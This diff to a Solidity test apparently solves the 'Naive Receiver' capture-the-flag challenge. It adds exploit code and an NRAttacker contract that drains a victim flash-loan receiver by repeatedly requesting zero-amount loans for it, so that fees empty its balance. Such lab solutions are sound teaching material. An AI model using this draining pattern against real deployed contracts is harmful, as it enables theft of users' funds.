@@ -49,6 +49,19 @@ contract NaiveReceiver is Test {
          * EXPLOIT START *
          */
 
+        vm.startPrank(attacker);
+        // in 10 transactions, drain the pool
+        // while (address(flashLoanReceiver).balance != 0){
+        //     naiveReceiverLenderPool.flashLoan(
+        //         address(flashLoanReceiver),
+        //         0
+        //     );
+        // }
+
+        // in single transaction, drain the pool
+        NRAttacker attackerCon = new NRAttacker(payable(naiveReceiverLenderPool));
+        attackerCon.attack(address(flashLoanReceiver));
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
@@ -61,4 +74,22 @@ contract NaiveReceiver is Test {
         assertEq(address(flashLoanReceiver).balance, 0);
         assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
     }
+}
+
+interface IPool {
+    function flashLoan(address borrower, uint256 borrowAmount) external;
+}
+
+contract NRAttacker {
+    IPool pool;
+
+    constructor(address payable _poolAddress) {
+        pool = IPool(_poolAddress);
+    }
+    function attack(address victim) external {
+        while(address(victim).balance != 0) {
+            pool.flashLoan(victim, 0);
+        }
+    }
+
 }
